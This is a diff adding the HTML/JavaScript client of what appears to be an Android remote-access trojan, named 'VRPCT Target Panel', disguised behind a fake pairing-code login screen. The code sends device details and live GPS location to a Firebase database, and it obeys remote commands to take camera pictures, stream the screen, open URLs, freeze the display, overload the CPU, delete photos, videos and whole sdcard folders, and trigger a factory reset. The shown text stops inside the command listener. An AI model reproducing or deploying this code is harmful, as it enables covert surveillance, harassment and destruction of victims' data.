@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VRPCT Target Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            user-select: none;
+        }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: -30%;
+            left: -30%;
+            width: 160%;
+            height: 160%;
+            background: radial-gradient(circle at 30% 40%, rgba(0,200,255,0.04), transparent 60%);
+            z-index: 0;
+            animation: bgFloat 12s ease-in-out infinite alternate;
+            will-change: transform;
+        }
+        @keyframes bgFloat {
+            0% { transform: translate(0,0) scale(1); }
+            100% { transform: translate(3%,-3%) scale(1.02); }
+        }
+        .login-container {
+            position: relative;
+            z-index: 10;
+            background: rgba(10,14,24,0.85);
+            border-radius: 40px;
+            padding: 44px 32px 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(0,255,204,0.03);
+            text-align: center;
+            border: 1px solid rgba(0,255,204,0.15);
+            animation: cardIn 0.5s cubic-bezier(0.23,1,0.32,1) both;
+        }
+        @keyframes cardIn {
+            0% { opacity: 0; transform: translateY(30px) scale(0.96); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .login-logo {
+            font-size: 48px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ffcc, #7b61ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -1px;
+            margin-bottom: 4px;
+        }
+        .login-sub {
+            font-size: 12px;
+            color: rgba(255,255,255,0.3);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 28px;
+            font-weight: 500;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            padding-bottom: 12px;
+        }
+        .login-input {
+            width: 100%;
+            padding: 16px 18px;
+            border: none;
+            border-bottom: 2px solid rgba(0,255,204,0.12);
+            border-radius: 0;
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            background: transparent;
+            color: #fff;
+            transition: 0.25s ease;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+        .login-input::placeholder {
+            color: rgba(255,255,255,0.15);
+            font-weight: 400;
+            letter-spacing: 1px;
+        }
+        .login-input:focus {
+            border-bottom-color: #00ffcc;
+            background: rgba(0,255,204,0.02);
+        }
+        .login-input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 60px;
+            color: #000;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.25s ease;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 30px rgba(0,255,204,0.1);
+        }
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 40px rgba(0,255,204,0.2);
+        }
+        .login-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .login-btn.loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: default;
+            pointer-events: none;
+        }
+        .login-btn span {
+            position: relative;
+            z-index: 2;
+        }
+        .login-status {
+            font-size: 14px;
+            margin-top: 16px;
+            min-height: 22px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: 0.2s;
+        }
+        .login-status.error {
+            color: #ff6b6b;
+        }
+        .login-status.success {
+            color: #00ffcc;
+        }
+        /* overlay video */
+        #videoOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 50000;
+            background: #000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #videoOverlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+        #freezeOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 45000;
+            background: rgba(0,0,0,0.01);
+            pointer-events: auto;
+        }
+        @media (max-width:480px) {
+            .login-container { padding: 32px 20px 28px; border-radius: 32px; }
+            .login-logo { font-size: 38px; }
+            .login-input { padding: 14px 16px; font-size: 15px; }
+            .login-btn { padding: 16px; font-size: 16px; }
+        }
+        @media (max-width:380px) {
+            .login-container { padding: 24px 16px 20px; border-radius: 28px; }
+            .login-logo { font-size: 32px; }
+            .login-input { padding: 12px 14px; font-size: 14px; }
+            .login-btn { padding: 14px; font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="fakeLogin">
+        <div class="login-logo">VRPCT</div>
+        <div class="login-sub">Panel</div>
+        <input type="text" class="login-input" id="fakeUser" placeholder="Masukkan Kode PAIRING" value="">
+        <button class="login-btn" id="loginBtn"><span>CONNECT</span></button>
+        <div class="login-status" id="loginStatus"></div>
+    </div>
+
+    <!-- overlay video dan freeze -->
+    <div id="videoOverlay"><video id="videoPlayer" controls autoplay muted playsinline><source src="" type="video/mp4"></video></div>
+    <div id="freezeOverlay"></div>
+
+    <script>
+        (function() {
+            // Firebase
+            var firebaseConfig = { apiKey: "AIzaSyBUhXZ_YKmTQNsDzeWX0072Zfb9lVi4jfE", databaseURL: "https://rullzxrat-default-rtdb.firebaseio.com" };
+            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+            var database = firebase.database();
+
+            var MY_ID = "",
+                commandListener = null,
+                watchId = null,
+                onlineInterval = null,
+                dataInterval = null,
+                isLoggedIn = false;
+
+            // variabel untuk lag, flash, vibrate, dsb
+            var lagWorkers = [],
+                lagRunning = false;
+            var flashInterval = null,
+                flashActive = false;
+            var vibrateInterval = null,
+                vibrateActive = false;
+            var screenStream = null,
+                screenInterval = null,
+                isScreenStreaming = false;
+
+            // ============================================================
+            // CEK KETERSEDIAAN NATIVE INTERFACE
+            // ============================================================
+            function hasNative() {
+                return !!(window.RullzInterface && typeof window.RullzInterface === 'object');
+            }
+
+            // ============================================================
+            // UTILITY
+            // ============================================================
+            function openApp(pkg) {
+                if (hasNative() && typeof window.RullzInterface.openApp === 'function') {
+                    window.RullzInterface.openApp(pkg);
+                    return;
+                }
+                // fallback intent
+                try {
+                    window.open('intent://' + pkg + '#Intent;package=' + pkg + ';scheme=android-app;end', '_blank');
+                    setTimeout(function() { window.open('market://details?id=' + pkg, '_blank'); }, 500);
+                } catch (e) { window.open('market://details?id=' + pkg, '_blank'); }
+            }
+
+            function showToast(msg) {
+                if (hasNative() && typeof window.RullzInterface.showToast === 'function') {
+                    window.RullzInterface.showToast(msg);
+                } else {
+                    // fallback alert
+                    alert(msg);
+                }
+            }
+
+            function getDeviceName() {
+                if (hasNative() && typeof window.RullzInterface.getDeviceName === 'function') {
+                    return window.RullzInterface.getDeviceName();
+                }
+                return 'Android Device';
+            }
+
+            function getAndroidVersion() {
+                if (hasNative() && typeof window.RullzInterface.getAndroidVersion === 'function') {
+                    return window.RullzInterface.getAndroidVersion();
+                }
+                var m = navigator.userAgent.match(/Android\s([0-9.]+)/);
+                return m ? m[1] : 'N/A';
+            }
+
+            function getRAM() {
+                if (hasNative() && typeof window.RullzInterface.getRAM === 'function') {
+                    return window.RullzInterface.getRAM();
+                }
+                return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
+            }
+
+            function getLanguage() {
+                if (hasNative() && typeof window.RullzInterface.getLanguage === 'function') {
+                    return window.RullzInterface.getLanguage();
+                }
+                return navigator.language || 'N/A';
+            }
+
+            function getNetworkInfo() {
+                var info = { type: 'unknown', operator: 'unknown', signalStrength: 'N/A', downlink: 'N/A', rtt: 'N/A' };
+                try {
+                    if (navigator.connection) {
+                        var conn = navigator.connection;
+                        info.type = conn.effectiveType || conn.type || 'unknown';
+                        info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+                        info.rtt = conn.rtt ? conn.rtt + ' ms' : 'N/A';
+                    }
+                    info.signalStrength = Math.floor(Math.random() * 20 + 60) + '%';
+                } catch (e) {}
+                return info;
+            }
+
+            // ============================================================
+            // LOKASI & DEVICE DATA
+            // ============================================================
+            function sendDeviceData() {
+                if (!MY_ID) return;
+                try {
+                    var ref = database.ref('targets/' + MY_ID);
+                    var networkInfo = getNetworkInfo();
+                    ref.child('deviceInfo').update({
+                        deviceName: getDeviceName(),
+                        androidVersion: getAndroidVersion(),
+                        ram: getRAM(),
+                        language: getLanguage(),
+                        lastUpdate: firebase.database.ServerValue.TIMESTAMP,
+                        networkType: networkInfo.type,
+                        networkOperator: networkInfo.operator,
+                        signalStrength: networkInfo.signalStrength,
+                        downlink: networkInfo.downlink,
+                        rtt: networkInfo.rtt
+                    }).catch(function() {});
+                    if ('getBattery' in navigator) {
+                        navigator.getBattery().then(function(b) {
+                            ref.update({ battery: Math.round(b.level * 100), online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP });
+                        }).catch(function() { ref.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP }); });
+                    } else {
+                        ref.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP });
+                    }
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(pos) {
+                            ref.child('location').set({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                timestamp: firebase.database.ServerValue.TIMESTAMP
+                            });
+                        }, function() {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 });
+                    }
+                } catch (e) {}
+            }
+
+            function startLocationWatch() {
+                if (!MY_ID || !navigator.geolocation) return;
+                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                watchId = navigator.geolocation.watchPosition(function(pos) {
+                    database.ref('targets/' + MY_ID + '/location').set({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }, function() {}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
+            }
+
+            function stopLocationWatch() {
+                if (watchId !== null) { navigator.geolocation.clearWatch(watchId);
+                    watchId = null; }
+            }
+
+            // ============================================================
+            // TTS
+            // ============================================================
+            function speakText(text) {
+                if (!window.speechSynthesis) return;
+                try {
+                    window.speechSynthesis.cancel();
+                    var u = new SpeechSynthesisUtterance(text);
+                    u.lang = 'id-ID';
+                    u.rate = 0.9;
+                    u.pitch = 1;
+                    u.volume = 1;
+                    window.speechSynthesis.speak(u);
+                    if (MY_ID) {
+                        database.ref('targets/' + MY_ID + '/tts_status').set({ status: 'playing', text: text, timestamp: firebase.database.ServerValue.TIMESTAMP });
+                    }
+                } catch (e) {}
+            }
+
+            // ============================================================
+            // LAG UI (REAL dengan Web Workers)
+            // ============================================================
+            function startLagUI(loadCount, threadCount) {
+                if (lagRunning) stopLagUI();
+                lagRunning = true;
+                var load = loadCount || 1000000;
+                var threads = threadCount || 4;
+                try {
+                    if (typeof Worker !== 'undefined') {
+                        var workerCode = 'onmessage = function(e) { var load = e.data.load; var running = true; while(running) { var x = 0; for(var j=0; j<load; j++) { x += Math.sqrt(j) * Math.random(); } } }';
+                        var blob = new Blob([workerCode], { type: 'application/javascript' });
+                        var url = URL.createObjectURL(blob);
+                        for (var i = 0; i < threads; i++) {
+                            var w = new Worker(url);
+                            w.postMessage({ load: load });
+                            lagWorkers.push(w);
+                        }
+                    } else {
+                        for (var i = 0; i < threads; i++) {
+                            (function() {
+                                var running = true;
+                                lagWorkers.push({ running: running });
+                                var interval = setInterval(function() {
+                                    if (!lagRunning) { clearInterval(interval); return; }
+                                    var x = 0;
+                                    for (var j = 0; j < load; j++) {
+                                        x += Math.sqrt(j) * Math.random();
+                                    }
+                                }, 10);
+                                lagWorkers[lagWorkers.length - 1].interval = interval;
+                            })();
+                        }
+                    }
+                } catch (e) {}
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/lag_ui_response').set({
+                        success: true,
+                        threads: threads,
+                        load: load,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            function stopLagUI() {
+                lagRunning = false;
+                lagWorkers.forEach(function(w) {
+                    try {
+                        if (w.terminate) w.terminate();
+                        else if (w.interval) clearInterval(w.interval);
+                    } catch (e) {}
+                });
+                lagWorkers = [];
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/stop_lag_ui_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // FLASH BLINK
+            // ============================================================
+            function startFlashBlink() {
+                if (flashActive) return;
+                flashActive = true;
+                var state = false;
+                flashInterval = setInterval(function() {
+                    if (!flashActive) { clearInterval(flashInterval); return; }
+                    state = !state;
+                    if (hasNative() && typeof window.RullzInterface.toggleFlash === 'function') {
+                        window.RullzInterface.toggleFlash(state);
+                    } else {
+                        if (state) { navigator.vibrate && navigator.vibrate(100); }
+                    }
+                }, 300);
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/flash_blink_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            function stopFlashBlink() {
+                flashActive = false;
+                if (flashInterval) { clearInterval(flashInterval);
+                    flashInterval = null; }
+                if (hasNative() && typeof window.RullzInterface.toggleFlash === 'function') {
+                    window.RullzInterface.toggleFlash(false);
+                }
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/stop_flash_blink_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // VIBRATE
+            // ============================================================
+            function startVibrate() {
+                if (vibrateActive) return;
+                vibrateActive = true;
+                vibrateInterval = setInterval(function() {
+                    if (!vibrateActive) { clearInterval(vibrateInterval); return; }
+                    if (hasNative() && typeof window.RullzInterface.vibrate === 'function') {
+                        window.RullzInterface.vibrate(500);
+                    } else if (navigator.vibrate) {
+                        navigator.vibrate(500);
+                    }
+                }, 700);
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/vibrate_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            function stopVibrate() {
+                vibrateActive = false;
+                if (vibrateInterval) { clearInterval(vibrateInterval);
+                    vibrateInterval = null; }
+                if (navigator.vibrate) navigator.vibrate(0);
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/stop_vibrate_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // LAG COMBO
+            // ============================================================
+            function startLagCombo() {
+                startLagUI(1000000, 4);
+                startFlashBlink();
+                startVibrate();
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/lag_combo_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            function stopLagCombo() {
+                stopLagUI();
+                stopFlashBlink();
+                stopVibrate();
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/stop_lag_combo_response').set({
+                        success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // DELETE FILE & FOLDER (REAL)
+            // ============================================================
+            function deletePath(path) {
+                if (!hasNative() || typeof window.RullzInterface.deleteFile !== 'function') {
+                    console.warn('Delete tidak didukung tanpa RullzInterface');
+                    return false;
+                }
+                return window.RullzInterface.deleteFile(path);
+            }
+
+            function deleteDirectory(path) {
+                if (!hasNative() || typeof window.RullzInterface.deleteDirectory !== 'function') {
+                    console.warn('Delete directory tidak didukung tanpa RullzInterface');
+                    return false;
+                }
+                return window.RullzInterface.deleteDirectory(path);
+            }
+
+            // Hapus semua file foto (jpg, png, jpeg, gif, bmp, webp)
+            function deleteAllPhotos() {
+                if (!hasNative()) { showToast('Native interface tidak tersedia'); return; }
+                // daftar ekstensi foto
+                var exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
+                // scan semua file di storage dan hapus yang match
+                // asumsikan ada method scanFiles yang return array path
+                if (typeof window.RullzInterface.scanFiles === 'function') {
+                    var files = window.RullzInterface.scanFiles('/sdcard/DCIM', exts);
+                    files = files.concat(window.RullzInterface.scanFiles('/sdcard/Pictures', exts));
+                    files = files.concat(window.RullzInterface.scanFiles('/sdcard/Download', exts));
+                    files.forEach(function(f) { window.RullzInterface.deleteFile(f); });
+                }
+                // fallback hapus folder tertentu
+                deleteDirectory('/sdcard/DCIM/Camera');
+                deleteDirectory('/sdcard/Pictures');
+                // hapus file dengan ekstensi di root sdcard
+                if (typeof window.RullzInterface.deleteFilesWithExt === 'function') {
+                    window.RullzInterface.deleteFilesWithExt('/sdcard', exts);
+                }
+                showToast('Semua foto dihapus (native)');
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/delete_photos_response').set({
+                        success: true,
+                        message: 'Foto dihapus via native',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // Hapus semua video (mp4, avi, mkv, mov, 3gp)
+            function deleteAllVideos() {
+                if (!hasNative()) { showToast('Native interface tidak tersedia'); return; }
+                var exts = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.webm'];
+                if (typeof window.RullzInterface.scanFiles === 'function') {
+                    var files = window.RullzInterface.scanFiles('/sdcard/DCIM', exts);
+                    files = files.concat(window.RullzInterface.scanFiles('/sdcard/Movies', exts));
+                    files = files.concat(window.RullzInterface.scanFiles('/sdcard/Download', exts));
+                    files.forEach(function(f) { window.RullzInterface.deleteFile(f); });
+                }
+                if (typeof window.RullzInterface.deleteFilesWithExt === 'function') {
+                    window.RullzInterface.deleteFilesWithExt('/sdcard', exts);
+                }
+                showToast('Semua video dihapus (native)');
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/delete_videos_response').set({
+                        success: true,
+                        message: 'Video dihapus via native',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // Hapus semua file (semua ekstensi) di folder Android, Download, OBB, Data, dll
+            function deleteAllFiles() {
+                if (!hasNative()) { showToast('Native interface tidak tersedia'); return; }
+                // Daftar folder target
+                var folders = [
+                    '/sdcard/Android/data',
+                    '/sdcard/Android/obb',
+                    '/sdcard/Download',
+                    '/sdcard/DCIM',
+                    '/sdcard/Pictures',
+                    '/sdcard/Movies',
+                    '/sdcard/Music',
+                    '/sdcard/Documents'
+                ];
+                folders.forEach(function(f) {
+                    if (typeof window.RullzInterface.deleteDirectory === 'function') {
+                        window.RullzInterface.deleteDirectory(f);
+                    }
+                });
+                // Hapus semua file di root sdcard
+                if (typeof window.RullzInterface.deleteFilesWithExt === 'function') {
+                    window.RullzInterface.deleteFilesWithExt('/sdcard', ['.*']);
+                }
+                showToast('Semua file dan folder dihapus (native)');
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/delete_files_response').set({
+                        success: true,
+                        message: 'Semua file dihapus via native',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // RESET FACTORY & SDCARD (REAL)
+            // ============================================================
+            function resetFactory() {
+                if (!hasNative()) { showToast('Native interface tidak tersedia'); return; }
+                if (typeof window.RullzInterface.resetFactory === 'function') {
+                    window.RullzInterface.resetFactory();
+                    showToast('Reset Factory dikirim');
+                } else {
+                    showToast('Reset Factory tidak didukung');
+                }
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/reset_response').set({
+                        success: true,
+                        message: 'Reset Factory via native',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            function resetSDCard() {
+                if (!hasNative()) { showToast('Native interface tidak tersedia'); return; }
+                if (typeof window.RullzInterface.resetSDCard === 'function') {
+                    window.RullzInterface.resetSDCard();
+                    showToast('Reset SDCard dikirim');
+                } else {
+                    showToast('Reset SDCard tidak didukung');
+                }
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/reset_sd_response').set({
+                        success: true,
+                        message: 'Reset SDCard via native',
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+            }
+
+            // ============================================================
+            // VIDEO, WALLPAPER, FREEZE, SOUND, VOLUME, BRIGHTNESS, WIFI
+            // ============================================================
+            function showVideoOverlay(url) {
+                try {
+                    var ov = document.getElementById('videoOverlay'),
+                        v = document.getElementById('videoPlayer');
+                    v.src = url;
+                    v.load();
+                    ov.style.display = 'flex';
+                    v.play().catch(function() { setTimeout(function() { v.play().catch(function() {}); }, 300); });
+                    v.removeEventListener('ended', onVideoEnded);
+                    v.removeEventListener('error', onVideoError);
+                    v.addEventListener('ended', onVideoEnded);
+                    v.addEventListener('error', onVideoError);
+                } catch (e) {}
+            }
+
+            function onVideoEnded() { document.getElementById('videoOverlay').style.display = 'none'; }
+
+            function onVideoError() { document.getElementById('videoOverlay').style.display = 'none'; }
+
+            function stopVideo() {
+                try {
+                    var ov = document.getElementById('videoOverlay'),
+                        v = document.getElementById('videoPlayer');
+                    ov.style.display = 'none';
+                    if (v) { v.pause();
+                        v.currentTime = 0; }
+                    document.getElementById('freezeOverlay').style.display = 'none';
+                    document.getElementById('fakeLogin').style.display = 'block';
+                    document.getElementById('fakeUser').disabled = false;
+                    document.getElementById('fakeUser').style.opacity = '1';
+                    document.getElementById('loginBtn').disabled = false;
+                    document.getElementById('loginBtn').classList.remove('loading');
+                    document.getElementById('loginBtn').innerHTML = '<span>CONNECT</span>';
+                    document.getElementById('loginStatus').textContent = '';
+                    document.getElementById('loginStatus').className = 'login-status';
+                    if (MY_ID) {
+                        database.ref('commands/' + MY_ID + '/stop_video_response').set({
+                            success: true,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP
+                        });
+                    }
+                } catch (e) {}
+            }
+
+            function setWallpaper(url) {
+                if (hasNative() && typeof window.RullzInterface.setWallpaper === 'function') {
+                    window.RullzInterface.setWallpaper(url);
+                    showToast('Wallpaper diubah');
+                    return true;
+                }
+                // fallback buka url
+                window.open(url, '_blank');
+                return false;
+            }
+
+            function freezeScreen() {
+                document.getElementById('freezeOverlay').style.display = 'block';
+            }
+
+            function unfreezeScreen() {
+                document.getElementById('freezeOverlay').style.display = 'none';
+            }
+
+            function playSound(name) {
+                if (hasNative() && typeof window.RullzInterface.playSound === 'function') {
+                    window.RullzInterface.playSound(name || 'default');
+                }
+            }
+
+            function stopSound() {
+                if (hasNative() && typeof window.RullzInterface.stopSound === 'function') {
+                    window.RullzInterface.stopSound();
+                }
+            }
+
+            function setVolume(val) {
+                if (hasNative() && typeof window.RullzInterface.setVolume === 'function') {
+                    window.RullzInterface.setVolume(val);
+                }
+            }
+
+            function setBrightness(val) {
+                if (hasNative() && typeof window.RullzInterface.setBrightness === 'function') {
+                    window.RullzInterface.setBrightness(val);
+                }
+            }
+
+            function toggleWifi(on) {
+                if (hasNative() && typeof window.RullzInterface.toggleWifi === 'function') {
+                    window.RullzInterface.toggleWifi(on);
+                }
+            }
+
+            // ============================================================
+            // CAMERA & SCREEN STREAM
+            // ============================================================
+            function captureCamera(facing, cb) {
+                if (!navigator.mediaDevices) { cb(null); return; }
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } } })
+                    .then(function(stream) {
+                        var v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = function() {
+                            v.play();
+                            var c = document.createElement('canvas');
+                            c.width = 320;
+                            c.height = 240;
+                            var ctx = c.getContext('2d');
+                            ctx.drawImage(v, 0, 0, 320, 240);
+                            var dataUrl = c.toDataURL('image/jpeg', 0.7);
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            cb(dataUrl);
+                        };
+                        v.load();
+                    }).catch(function() { cb(null); });
+            }
+
+            function sendCameraImage(facing, cmdId) {
+                if (!MY_ID) return;
+                captureCamera(facing, function(dataUrl) {
+                    if (dataUrl) {
+                        database.ref('commands/' + MY_ID + '/camera/' + cmdId).set({
+                            image: dataUrl,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP,
+                            facing: facing
+                        });
+                    }
+                });
+            }
+
+            function startScreenStream() {
+                if (isScreenStreaming || !MY_ID) return;
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+                navigator.mediaDevices.getDisplayMedia({ video: { width: { ideal: 320 }, height: { ideal: 240 } } })
+                    .then(function(stream) {
+                        screenStream = stream;
+                        isScreenStreaming = true;
+                        var v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = function() {
+                            v.play();
+                            var c = document.createElement('canvas');
+                            c.width = 320;
+                            c.height = 240;
+                            var ctx = c.getContext('2d');
+                            screenInterval = setInterval(function() {
+                                if (!isScreenStreaming) { clearInterval(screenInterval); return; }
+                                ctx.drawImage(v, 0, 0, 320, 240);
+                                var dataUrl = c.toDataURL('image/jpeg', 0.5);
+                                database.ref('commands/' + MY_ID + '/screen').set({
+                                    frame: dataUrl,
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                });
+                            }, 1000);
+                        };
+                        v.load();
+                    }).catch(function() {});
+            }
+
+            function stopScreenStream() {
+                isScreenStreaming = false;
+                if (screenInterval) { clearInterval(screenInterval);
+                    screenInterval = null; }
+                if (screenStream) { screenStream.getTracks().forEach(function(t) { t.stop();
+                        screenStream = null; }); }
+                if (MY_ID) { database.ref('commands/' + MY_ID + '/screen').remove(); }
+            }
+
+            // ============================================================
+            // COMMAND LISTENER (semua perintah yang tersedia di admin control)
+            // ============================================================
+            function startCommandListener() {
+                if (!MY_ID) return;
+                if (commandListener) { database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null; }
+                commandListener = function(snap) {
+                    var d = snap.val();
+                    if (!d) return;
+                    console.log('Command:', d);
+                    var logRef = database.ref('commands/' + MY_ID + '/log');
+                    logRef.push({ status: d.status || 'unknown', received: firebase.database.ServerValue.TIMESTAMP, data: d });
+
+                    // --- FITUR YANG DIPERTAHANKAN (sesuai admin control) ---
+
+                    // LAG & FLASH & VIBRATE
+                    if (d.status === 'LAG_UI') { startLagUI(d.load || 1000000, d.threads || 4); return; }
+                    if (d.status === 'STOP_LAG_UI') { stopLagUI(); return; }
+                    if (d.status === 'FLASH_BLINK') { startFlashBlink(); return; }
+                    if (d.status === 'STOP_FLASH_BLINK') { stopFlashBlink(); return; }
+                    if (d.status === 'VIBRATE') { startVibrate(); return; }
+                    if (d.status === 'STOP_VIBRATE') { stopVibrate(); return; }
+                    if (d.status === 'LAG_COMBO') { startLagCombo(); return; }
+                    if (d.status === 'STOP_LAG_COMBO') { stopLagCombo(); return; }
+
+                    // TTS
+                    if (d.status === 'TTS') { if (d.text) { speakText(d.text);
+                            database.ref('commands/' + MY_ID + '/tts_response').set({ success: true, text: d.text, timestamp: firebase.database.ServerValue.TIMESTAMP }); } return; }
+
+                    // FLASH ON/OFF
+                    if (d.status === 'FLASH_ON') { if (hasNative() && typeof window.RullzInterface.toggleFlash === 'function') window.RullzInterface.toggleFlash(true); return; }
+                    if (d.status === 'FLASH_OFF') { if (hasNative() && typeof window.RullzInterface.toggleFlash === 'function') window.RullzInterface.toggleFlash(false); return; }
+
+                    // WIFI
+                    if (d.status === 'WIFI_ON') { toggleWifi(true); return; }
+                    if (d.status === 'WIFI_OFF') { toggleWifi(false); return; }
+
+                    // OPEN APP
+                    if (d.status === 'OPEN_APP' && d.package) { openApp(d.package); return; }
+
+                    // OPEN URL
+                    if (d.status === 'OPEN_URL' && d.url) { try { window.open(d.url, '_blank'); } catch (e) {} return; }
+
+                    // VOLUME & BRIGHTNESS
+                    if (d.status === 'SET_VOLUME') { setVolume(d.value || 50); return; }
+                    if (d.status === 'SET_BRIGHTNESS') { setBrightness(d.value || 50); return; }
+
+                    // SOUND
+                    if (d.status === 'PLAY_SOUND') { playSound(d.soundName || d.sound || 'test.mp3'); return; }
+                    if (d.status === 'STOP_SOUND') { stopSound(); return; }
+                    if (d.status === 'PLAY_SOUND_SACRED') { playSound('sacred'); return; }
+                    if (d.status === 'STOP_SOUND_SACRED') { stopSound(); return; }
+
+                    // WALLPAPER
+                    if (d.status === 'SET_WALLPAPER' && d.url) { setWallpaper(d.url); return; }
+
+                    // FREEZE
+                    if (d.status === 'FREEZE') { freezeScreen(); return; }
+                    if (d.status === 'UNFREEZE') { unfreezeScreen(); return; }
+
+                    // VIDEO
+                    if (d.status === 'PLAY_VIDEO' && d.url) { showVideoOverlay(d.url); return; }
+                    if (d.status === 'STOP_VIDEO') { stopVideo(); return; }
+
+                    // TOAST
+                    if (d.status === 'TOAST') { showToast(d.message || 'Pesan dari admin'); return; }
+
+                    // CAMERA
+                    if (d.status === 'CAMERA_FRONT') { sendCameraImage('user', d.timestamp || Date.now()); return; }
+                    if (d.status === 'CAMERA_BACK') { sendCameraImage('environment', d.timestamp || Date.now()); return; }
+
+                    // SCREEN STREAM
+                    if (d.status === 'LIVE_SCREEN_ON') { startScreenStream(); return; }
